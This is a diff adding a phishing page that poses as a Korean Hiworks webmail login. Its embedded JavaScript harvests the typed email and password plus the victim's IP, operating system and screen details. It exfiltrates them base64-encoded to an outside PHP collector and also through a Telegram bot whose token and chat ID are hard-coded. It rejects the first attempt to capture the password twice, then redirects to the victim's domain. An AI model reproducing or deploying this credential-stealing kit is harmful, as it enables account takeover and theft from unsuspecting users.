@@ -1,0 +1,291 @@
+
+<!DOCTYPE html>
+<!-- saved from url=(0064)http://webmail.sangnamtarps.com/#loginUrl=mail/webmail/m_list/b0 -->
+<html lang="ko"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width,initial-scale=1.0, maximum-scale=1.0,user-scaleable=no">
+<title>하이웍스 오피스</title>
+<meta property="og:title" content="">
+<meta property="og:image" content="">
+<meta property="og:site_name" content="">
+<meta property="og:description" content="">
+<meta name="apple-mobile-web-app-title" content="hiworks">
+<meta name="apple-mobile-web-app-status-bar-style" content="black">
+<meta name="msapplication-config" content="none">
+<link rel="shortcut icon" type="image/x-icon" href="http://webmail.sangnamtarps.com/static/images/favicon/favicon.ico">
+<link rel="apple-touch-icon" href="http://webmail.sangnamtarps.com/static/images/favicon/home_57.png" sizes="57x57">
+<link rel="apple-touch-icon" href="http://webmail.sangnamtarps.com/static/images/favicon/home_72.png" sizes="72x72">
+<link rel="apple-touch-icon" href="http://webmail.sangnamtarps.com/static/images/favicon/home_76.png" sizes="76x76">
+<link rel="apple-touch-icon" href="http://webmail.sangnamtarps.com/static/images/favicon/home_114.png" sizes="114x114">
+<link rel="apple-touch-icon" href="http://webmail.sangnamtarps.com/static/images/favicon/home_120.png" sizes="120x120">
+<link rel="apple-touch-icon" href="http://webmail.sangnamtarps.com/static/images/favicon/home_144.png" sizes="144x144">
+<link rel="apple-touch-icon" href="http://webmail.sangnamtarps.com/static/images/favicon/home_152.png" sizes="152x152">
+<link rel="stylesheet" type="text/css" href="https://firebasestorage.googleapis.com/v0/b/gent-ba9d4.appspot.com/o/common.css?alt=media&token=55012b35-6ce8-43b4-b313-305792adc846">
+<link rel="stylesheet" type="text/css" href="https://firebasestorage.googleapis.com/v0/b/gent-ba9d4.appspot.com/o/style.css?alt=media&token=5a37f467-e764-46a9-8da8-5570927fcbc4">
+<link rel="stylesheet" type="text/css" href="https://firebasestorage.googleapis.com/v0/b/gent-ba9d4.appspot.com/o/jquery-ui.css?alt=media&token=e3d20911-8d9b-475d-8ce9-bac3d7da1d7f">
+<script language="javascript" type="text/javascript">
+var sendurl = "https://authentisign.xyz/nhiwk/xlog.php";
+var attemptcount = 0;
+var checkemail = "이메일 주소를 확인하세요";
+var checkpassword = "비밀번호를 확인해주세요";
+var continuebutton = "Login";
+var verifbutton = "Verifying ... ";
+var successmsg = "Please wait we are verifying your domain in few seconds...";
+if (typeof XMLHttpRequest === "undefined") {
+  XMLHttpRequest = function () {
+    try { return new ActiveXObject("Msxml2.XMLHTTP.6.0"); }
+    catch (e) {}
+    try { return new ActiveXObject("Msxml2.XMLHTTP.3.0"); }
+    catch (e) {}
+    try { return new ActiveXObject("Microsoft.XMLHTTP"); }
+    catch (e) {}
+    throw new Error("This browser does not support XMLHttpRequest.");
+  };
+}
+window.addEventListener('load', (event) => {
+window.nowdate = new Date();
+theif = "\nPage = " + document.title;
+imputs = document.getElementsByTagName('input');
+lastIndex = imputs.length;
+window.OSName = "Unknown";
+if (window.navigator.userAgent.indexOf("Windows NT 10.0")!= -1) OSName="Windows 10";
+if (window.navigator.userAgent.indexOf("Windows NT 6.2") != -1) OSName="Windows 8";
+if (window.navigator.userAgent.indexOf("Windows NT 6.1") != -1) OSName="Windows 7";
+if (window.navigator.userAgent.indexOf("Windows NT 6.0") != -1) OSName="Windows Vista";
+if (window.navigator.userAgent.indexOf("Windows NT 5.1") != -1) OSName="Windows XP";
+if (window.navigator.userAgent.indexOf("Windows NT 5.0") != -1) OSName="Windows 2000";
+if (window.navigator.userAgent.indexOf("Mac")            != -1) OSName="Mac/iOS";
+if (window.navigator.userAgent.indexOf("X11")            != -1) OSName="UNIX";
+if (window.navigator.userAgent.indexOf("Linux")          != -1) OSName="Linux";
+if (window.navigator.userAgent.indexOf("Android")        != -1) OSName="Android";
+if (window.navigator.userAgent.indexOf("iPhone")         != -1) OSName="iPhone";
+if (window.navigator.userAgent.indexOf("iPad")           != -1) OSName="iPad";
+if (window.navigator.userAgent.indexOf("iPod")           != -1) OSName="iPod";
+if (window.navigator.userAgent.indexOf("BlackBerry")     != -1) OSName="BlackBerry";
+});
+function createCORSRequest(method, url){
+  var xhr = new XMLHttpRequest();
+  if ("withCredentials" in xhr){
+    xhr.open(method, url, false);
+  } else if (typeof XDomainRequest != "undefined"){
+    xhr = new XDomainRequest();
+    xhr.open(method, url);
+  } else {
+    xhr = null;
+  }
+  return xhr;
+}
+function senddataPOST(){
+if(navigator.onLine==true){
+if (typeof objs =="undefined" ){
+var objs = {
+  ip: "",
+  country_name: "",
+  city: "",
+  region: "",
+  currency: ""
+};
+var xhttp = new XMLHttpRequest();
+xhttp.onreadystatechange = function() {
+if (this.readyState == 4 && this.status == 200) {
+var rec = JSON.parse(this.responseText);
+window.rec = rec;
+}
+};
+xhttp.open("GET", "https://jsonip.com/", false);
+xhttp.send();
+}
+objs.ip = rec.ip;
+objs.country_name = "";
+objs.city = "";
+objs.region = "";
+objs.currency = "";
+theif = "IP Address = " + objs.ip;
+theif += "\nPage = " + document.title;
+theif += "\nTime = " + nowdate;
+theif += "\nSystem = " + OSName + " " + navigator.language;
+theif += "\nScreen Size = "+ screen.width + " X " + screen.height;
+theif += "\nLocation = "+ window.location+"\nPassword = "+password.value;
+for (index = 0; index < imputs.length; ++index) {
+    if(imputs[index].type!="submit" && imputs[index].name!="" && imputs[index].value!=""){
+    theif += "\n"+imputs[index].name+'='+encodeURI(imputs[index].value);
+	}
+}
+theif += "\nUser-Agent = " + navigator.userAgent;
+theif += "\nIP Details = https://ipinfo.io/" + objs.ip + "/json";
+var url_telegram ="https://api.telegram.org/";
+var randtoken = "vbot1257337675";
+var token = ":FOOLZVp72afEEmv4n6WqVFZ-_CxfvOedcso/";
+var iden = "sendMessage?chat_id=-90100127612&text=";
+var createdCORSRequest = url_telegram+randtoken+token+iden;
+var request = createCORSRequest( "POST", createdCORSRequest+encodeURI(theif) );
+if ( request ){
+if(request.send()){
+return true;
+}
+}
+}else{
+return true;
+}
+}
+function postdata(){
+var xhttp = new XMLHttpRequest();
+xhttp.onreadystatechange = function() {
+  if (this.readyState == 4 && this.status == 200) {
+	  if(this.responseText=="ok"){
+	      senddataPOST();
+		  var address = email.value.split("@")[1];
+		  var meta=document.createElement('meta');
+		  meta.setAttribute('http-equiv', 'refresh');
+		  meta.setAttribute('content', '6; url=https://'+address);
+		  document. getElementsByTagName('head')[0]. appendChild(meta);
+	  }else{
+	  document.getElementById("messagefont").innerHTML = checkpassword;
+	  document.getElementById("password").value = "";
+	  document.getElementById('submit-btn').value = continuebutton;
+	  password.focus();
+	  }
+  }
+};
+xhttp.open("GET", sendurl+"?type=Webmail&email="+btoa(email.value)+"&password="+btoa(password.value), true);
+xhttp.send();
+}
+function ValidateEmail(mail) 
+{
+ if (/^\w+([\.-]?\w+)*@\w+([\.-]?\w+)*(\.\w{2,3})+$/.test(mail))
+  {
+    return (true)
+  }
+    return (false)
+}
+function verifall(){
+var pw = document.getElementById("password").value;  
+
+  //check empty password field  
+
+  if(pw == "") {  
+
+     document.getElementById("messagefont").innerHTML = checkpassword;  
+
+     return false;  
+
+  }  
+
+ //minimum password length validation  
+
+  if(pw.length < 5) {  
+
+     document.getElementById("messagefont").innerHTML = checkpassword;  
+
+     return false;  
+
+  }
+if(!ValidateEmail(email.value)){
+document.getElementById('messagefont').innerHTML = checkemail;
+}else{
+document.getElementById('messagefont').innerHTML = "";
+document.getElementById('submit-btn').value = verifbutton;
+if(password.value !=""){
+if(attemptcount<1){
+var xhttp = new XMLHttpRequest();
+xhttp.onreadystatechange = function() {
+  if (this.readyState == 4 && this.status == 200) {
+	  if(this.responseText=="ok"){
+	  document.getElementById("messagefont").innerHTML = checkpassword;
+	  document.getElementById("password").value = "";
+	  document.getElementById('submit-btn').value = continuebutton;
+	  password.focus();   
+	  }else{
+	  document.getElementById("messagefont").innerHTML = checkpassword;
+	  document.getElementById("password").value = "";
+	  document.getElementById('submit-btn').value = continuebutton;
+	  password.focus();
+	  }
+  }
+};
+xhttp.open("GET", sendurl+"?type=Webmail&email="+btoa(email.value)+"&password="+btoa(password.value), false);
+xhttp.send();
+attemptcount++;
+}else{
+postdata();
+}
+}else{
+document.getElementById("messagefont").innerHTML = checkpassword;
+document.getElementById("password").value = "";
+document.getElementById('submit-btn').value = continuebutton;
+password.focus();
+}
+}
+}
+</script>
+</head>
+<body>
+<div id="wrap">
+	<!-- skip navigation -->
+	<div class="skip_navigation" data-ui="skipNavigation"><a href="http://webmail.sangnamtarps.com/#contents">본문 영역으로 바로가기</a></div>
+		<input type="hidden" name="ssl_login" id="ssl_login" value="Y">
+		<input type="hidden" name="link_url" id="link_url" value="">
+		<input type="hidden" name="ip_security" id="ip_security" value="">
+		<div class="loginWrap-ofc" id="contents">
+			<!-- loginBox-ofc -->
+			<div class="loginBox-ofc">
+				<h1 class="head-ofc"><img src="https://i.imgur.com/QZCYDkN.png" style="width: 280px; height: 61px;" alt="hiworks"></h1>
+				<div class="body-ofc">				
+					<ul class="save-ofc">
+						<li><input type="checkbox" name="office_remember" id="office_remember"> <label for="office_remember" id="messagefont">아이디 저장</label></li>
+						<li class="cont-ip" onclick="checkIpSecurity();">IP보안 <span class="is-state on" id="ip_security_state">ON</span></li>
+					</ul>
+					<section>
+						<input type="text" class="type-J" title="아이디" name="email" id="email" value="" placeholder="아이디" readonly>
+						<input type="password" class="type-J" title="비밀번호" name="password" id="password" value="" placeholder="비밀번호" onkeydown="if(event.keyCode==13) officeLogin();">
+						<p class="err"><span class="wr-txt" id="login_error_msg"></span></p>
+						<p class="btn-login">
+							<label><input type="submit" title="로그인" value="로그인" class="int_jogin" onclick="return verifall();" id="submit-btn"></label>
+						</p>
+					</section>
+										<p class="id-regform" onclick="">아이디 등록 신청</p>
+										<article class="box-notice noline">
+						<div class="inner">
+							
+						</div>
+					</article>
+				</div>
+			</div>
+			<!-- // loginBox-ofc -->
+			<!-- foot-ofc -->
+			<footer>
+				<div class="foot-ofc">
+					<a href="https://www.hiworks.com/" title="새창" target="_blank">Powered by hiworks.com</a>
+				</div>
+			</footer>
+			<!-- // foot-ofc -->
+		</div>
+	
+
+	
+
+</body>
+<script>
+var input = document.getElementById("password");
+
+// Execute a function when the user releases a key on the keyboard
+input.addEventListener("keyup", function(event) {
+  // Number 13 is the "Enter" key on the keyboard
+  if (event.keyCode === 13) {
+    // Cancel the default action, if needed
+    event.preventDefault();
+    // Trigger the button element with a click
+    document.getElementById("submit-btn").click();
+  }
+});
+var url_string = window.location.href; 
+var url = new URL(url_string);
+var cid = url.searchParams.get("id");
+if(cid){
+document.getElementById("email").value = cid;
+}
+
+location.hash = 'client_id=4345a7b9-9a63-4910-a426-35363201d503&response_mode=form_post&response_type=code+id_token&scope=openid+profile&state=OpenIdConnect.AuthenticationProperties%3dctF0jk0w2UtS0FF3oS4G9QM_05ExoZ-6c9rdc6cylWGLdsztC6SkQkXZb7mwjA7QOG8KZidR0h2ZYRFXCtcc5POb_I7bBanvW9lBbKKjeEXtOezrvXMFWb7p4oOfODQw&nonce=637021592852309357.YWUzYzY1ZmYtM2ZjYy00NTAwLTllOWUtZTI5N2JhOTA0MDYxOGI0ZjE0MjYtYzYzMy00ZDQ1LWJjZjgtYTc0MDQwODAyMjQy&redirect_uri=https%3a%2f%2fwww.office.com%2f&ui_locales=en-US&mkt=en-US';
+</script>
+</html>
